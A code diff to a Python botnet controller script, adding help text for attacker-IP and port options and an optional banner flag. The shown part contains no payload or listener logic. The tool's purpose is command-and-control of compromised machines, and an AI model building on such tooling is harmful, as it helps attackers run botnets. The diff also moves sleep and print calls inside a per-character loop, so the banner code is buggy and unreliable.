@@ -5,25 +5,30 @@ from colorama import Fore,init
 from colorama import Back as bg
 from multiprocessing import Process
 parser = argparse.ArgumentParser(description='BotNet Attacker-Main Controller')
-parser.add_argument('-ip','--attackerip',metavar='',help='')
-parser.add_argument('-p','--port',metavar='',help='')
+parser.add_argument('-ip','--attackerip',metavar='',help='Attacker IP')
+parser.add_argument('-p','--port',metavar='',help='Port to listen on')
+parser.add_argument('-b','--banner',metavar='',help='Input banner to show banner')
 args = parser.parse_args()
 init(autoreset=True)
 class Controller(object):
-    def __init__(self,ip,port):
+    def __init__(self,ip,port,banner):
         self.ip = ip
         self.port = port
+        self.banner = banner
     @staticmethod
     def show_banner(s):
-        for c in s + '\n':
-            sys.stdout.write(bg.BLACK + Fore.YELLOW + c)
-            sys.stdout.flush()
-            time.sleep(1.2 / 100)
-        time.sleep(1.5)
-        print('-----------------------------------------------------------------')
-        print(Fore.WHITE + '[' + Fore.GREEN + '+' + Fore.WHITE + ']Made By Droid | Github:https://github.com/FonderElite')
-        print('-----------------------------------------------------------------')
-        time.sleep(1.5)
+        if args.banner != None:
+            for c in s + '\n':
+                sys.stdout.write(bg.BLACK + Fore.YELLOW + c)
+                sys.stdout.flush()
+                time.sleep(1.2 / 100)
+                time.sleep(1.5)
+                print('-----------------------------------------------------------------')
+                print(Fore.WHITE + '[' + Fore.GREEN + '+' + Fore.WHITE + ']Made By Droid | Github:https://github.com/FonderElite')
+                print('-----------------------------------------------------------------')
+                time.sleep(1.5)
+        else:
+            pass
 
     def listen(self):
         try:
@@ -81,7 +86,7 @@ class Controller(object):
 
 
 if __name__ == "__main__":
-    main_class = Controller(args.attackerip,args.port)
+    main_class = Controller(args.attackerip,args.port,args.banner)
     banner = Process(target=main_class.show_banner,args=('''
   .:'                                  `:.
  ::'                                    `::
@@ -115,3 +120,4 @@ if __name__ == "__main__":
     listener.join()
     time_elapsed.start()
     time_elapsed.join()
+
